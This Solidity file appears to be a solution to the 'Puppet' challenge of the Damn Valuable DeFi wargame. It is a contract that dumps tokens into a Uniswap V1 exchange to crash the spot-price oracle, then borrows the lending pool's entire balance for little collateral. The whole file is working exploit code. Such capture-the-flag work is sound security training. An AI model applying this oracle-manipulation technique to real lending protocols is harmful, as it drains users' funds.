// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract HackerPuppet {
    DamnValuableToken public immutable token;
    PuppetPool public immutable lendingPool;
    IUniswapV1Exchange public immutable uniswapV1Exchange;
    address public immutable recovery;
    address public immutable player;

    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery,
        address _player
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
        player = _player;
        require(msg.sender == player, "only player");

        uint256 playerTokenBalance = token.balanceOf(player);
        uint256 poolTokenBalance = token.balanceOf(address(lendingPool));
        token.transferFrom(player, address(this), playerTokenBalance);
        token.approve(address(uniswapV1Exchange), playerTokenBalance);
        uniswapV1Exchange.tokenToEthSwapInput(
            playerTokenBalance,
            1, // accept any non-zero ETH out
            block.timestamp * 2
        );

        uint256 collateralRequired = lendingPool.calculateDepositRequired(
            poolTokenBalance
        );
        lendingPool.borrow{value: collateralRequired}(
            poolTokenBalance,
            recovery
        );
    }

    receive() external payable {}
}
